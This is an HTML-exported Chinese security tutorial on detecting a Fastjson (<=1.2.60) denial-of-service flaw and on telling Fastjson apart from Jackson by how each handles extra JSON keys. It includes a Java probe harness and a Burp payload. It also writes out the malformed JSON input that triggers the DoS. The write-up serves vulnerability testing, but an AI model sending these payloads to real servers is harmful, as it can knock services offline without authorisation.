<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xd89aa44419eb62715ccc5a4951c86ce128bb99e"><span class="csDE05BCC">Fastjson &lt;=1.2.60 DoS</span><span class="csECDA2D3">漏洞无损检测</span><span class="csDE05BCC">+Fastjson</span><span class="csECDA2D3">与</span><span class="csDE05BCC">Jackson</span><span class="csECDA2D3">组建区分</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Fastjson 1.2.60 </span><span class="cs9C1B1871">以下版本</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">针对</span><span class="cs8926E06">Fastjson DoS </span><span class="cs9C1B1871">漏洞的检测，相对较好识别，但其需要发送</span><span class="cs8926E06"> DoS </span><span class="cs9C1B1871">的请求包，就会有一个时间延迟，但是部分使用者或</span><span class="cs8926E06"> SRC</span><span class="cs9C1B1871">平台对</span><span class="cs8926E06"> DoS </span><span class="cs9C1B1871">类漏洞持保守态度。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以这里提出一种无损检测</span><span class="cs8926E06"> Fastjson DoS </span><span class="cs9C1B1871">漏洞的方法。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先有以下几种情况：</span></p><h3 class="cs868C439D">
			<a name="未知目标是否使用-fastjson-但站点有原始报错回显"><span class="csD6CA00D2">未知目标是否使用</span><span class="csD1E291E2"> Fastjson </span><span class="csD6CA00D2">，但站点有原始报错回显</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有</span><span class="cs8926E06">fastjson</span><span class="cs9C1B1871">的字样</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%20_=1.2.60%20DoS%e6%bc%8f%e6%b4%9e%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8b+Fastjson%e4%b8%8eJackson%e7%bb%84%e5%bb%ba%e5%8c%ba%e5%88%86_files/image0.png" width="560" height="223" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="无回显盲区分-fastjson-和-jackson"><span class="csD6CA00D2">无回显，盲区分</span><span class="csD1E291E2"> Fastjson </span><span class="csD6CA00D2">和</span><span class="csD1E291E2"> Jackson</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Java </span><span class="cs9C1B1871">系</span><span class="cs8926E06"> Json </span><span class="cs9C1B1871">处理基本只有</span><span class="cs8926E06"> Fastjson </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> Jackson</span><span class="cs9C1B1871">。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">由于</span><span class="cs8926E06"> Jackson </span><span class="cs9C1B1871">相对比较严格</span><span class="cs8926E06">, </span><span class="cs9C1B1871">这里可以很好分辨出</span><span class="cs8926E06"> Fastjson </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> Jackson</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果请求包中的</span><span class="cs8926E06"> json </span><span class="cs9C1B1871">如下</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">{&quot;name&quot;:&quot;S&quot;, &quot;age&quot;:21}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">追加一个随机</span><span class="cs8926E06"> key ,</span><span class="cs9C1B1871">修改</span><span class="cs8926E06"> json </span><span class="cs9C1B1871">为</span></p><p class="cs40DD2BC9"><span class="cs8926E06">{&quot;name&quot;:&quot;S&quot;, &quot;age&quot;:21,&quot;agsbdkjada__ss_d&quot;:123}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里</span><span class="cs8926E06"> Fastjson </span><span class="cs9C1B1871">是不会报错的</span><span class="cs8926E06">, Jackson </span><span class="cs9C1B1871">因为强制</span><span class="cs8926E06"> key </span><span class="cs9C1B1871">与</span><span class="cs8926E06"> javabean </span><span class="cs9C1B1871">属性对齐</span><span class="cs8926E06">,</span><span class="cs9C1B1871">只能少不能多</span><span class="cs8926E06"> key,<br/></span><span class="cs9C1B1871">所以会报错</span><span class="cs8926E06">,</span><span class="cs9C1B1871">服务器的响应包中多少会有异常回显</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Fastjson</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%20_=1.2.60%20DoS%e6%bc%8f%e6%b4%9e%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8b+Fastjson%e4%b8%8eJackson%e7%bb%84%e5%bb%ba%e5%8c%ba%e5%88%86_files/image1.png" width="560" height="353" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Jackson</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%20_=1.2.60%20DoS%e6%bc%8f%e6%b4%9e%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8b+Fastjson%e4%b8%8eJackson%e7%bb%84%e5%bb%ba%e5%8c%ba%e5%88%86_files/image2.png" width="560" height="477" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="无损检测原理"><span class="csD6CA00D2">无损检测原理</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">已经知道目标使用的是</span><span class="cs8926E06"> Fastjson ,</span><span class="cs9C1B1871">可以用以下</span><span class="cs8926E06"> poc </span><span class="cs9C1B1871">去检测是否存在</span><span class="cs8926E06"> DOS </span><span class="cs9C1B1871">漏洞</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Fastjson &lt; 1.2.60 </span><span class="cs9C1B1871">在取不到值的时候会填充</span><span class="cs8926E06"> \u001a ,<br/></span><span class="cs9C1B1871">在</span><span class="cs8926E06">1.2.60 </span><span class="cs9C1B1871">进行了修复</span><span class="cs8926E06">, </span><span class="cs9C1B1871">对</span><span class="cs8926E06"> \x </span><span class="cs9C1B1871">后面的字符进行是否为</span><span class="cs8926E06">16</span><span class="cs9C1B1871">进制允许字符</span><span class="cs8926E06"> (0-9a-fA-F) </span><span class="cs9C1B1871">的校验</span><span class="cs8926E06">,<br/></span><span class="cs9C1B1871">所以这里就可以手动</span><span class="cs8926E06"> padding ,</span><span class="cs9C1B1871">构造一个特殊的字符串</span></p><p class="cs40DD2BC9"><span class="cs8926E06">\x\u001a\u001a</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试代码</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Main.java</span></p><p class="cs3A447A38"><span class="cs9FB05234">import com.alibaba.fastjson.JSON;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class Main {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String[] args) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String payload = &quot;{\&quot;a\&quot;:\&quot;\\x\u001a\u001a\&quot;}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(payload);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object o = JSON.parseObject(payload);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(o.getClass());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Fastjson &lt; 1.2.60</span></p><p class="cs40DD2BC9"><span class="cs8926E06">pom.xml</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;groupId&gt;tophant&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;artifactId&gt;tcc&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;dependencies&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;1.2.59&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/dependencies&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;/project&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%20_=1.2.60%20DoS%e6%bc%8f%e6%b4%9e%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8b+Fastjson%e4%b8%8eJackson%e7%bb%84%e5%bb%ba%e5%8c%ba%e5%88%86_files/image3.png" width="560" height="428" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Fastjson == 1.2.60</span><span class="cs9C1B1871">，可以看到报错</span></p><p class="cs40DD2BC9"><span class="cs8926E06">pom.xml</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;groupId&gt;tophant&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;artifactId&gt;tcc&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;dependencies&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;1.2.60&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/dependencies&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;/project&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%20_=1.2.60%20DoS%e6%bc%8f%e6%b4%9e%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8b+Fastjson%e4%b8%8eJackson%e7%bb%84%e5%bb%ba%e5%8c%ba%e5%88%86_files/image4.png" width="560" height="522" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="使用-burp-测试"><span class="csD6CA00D2">使用</span><span class="csD1E291E2"> Burp </span><span class="csD6CA00D2">测试</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06"> Burp </span><span class="cs9C1B1871">中测试可以使用</span><span class="cs8926E06"> : eyJhIjoiXHgaGiJ9 (base64</span><span class="cs9C1B1871">解码</span><span class="cs8926E06">)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当后端</span><span class="cs8926E06"> Fastjson </span><span class="cs9C1B1871">版本小于</span><span class="cs8926E06"> 1.2.60 </span><span class="cs9C1B1871">时，使用该请求包不会延时不会报错</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%20_=1.2.60%20DoS%e6%bc%8f%e6%b4%9e%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8b+Fastjson%e4%b8%8eJackson%e7%bb%84%e5%bb%ba%e5%8c%ba%e5%88%86_files/image5.png" width="560" height="525" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06"> {&quot;a:&quot;\x </span><span class="cs9C1B1871">进行请求就会发生</span><span class="cs8926E06"> DOS</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%20_=1.2.60%20DoS%e6%bc%8f%e6%b4%9e%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8b+Fastjson%e4%b8%8eJackson%e7%bb%84%e5%bb%ba%e5%8c%ba%e5%88%86_files/image6.png" width="560" height="531" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="四参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://blog.riskivy.com/%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8Bfastjson-dos%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E7%9B%B2%E5%8C%BA%E5%88%86fastjson%E4%B8%8Ejackson%E7%BB%84%E4%BB%B6/</span></p></body>
</html>
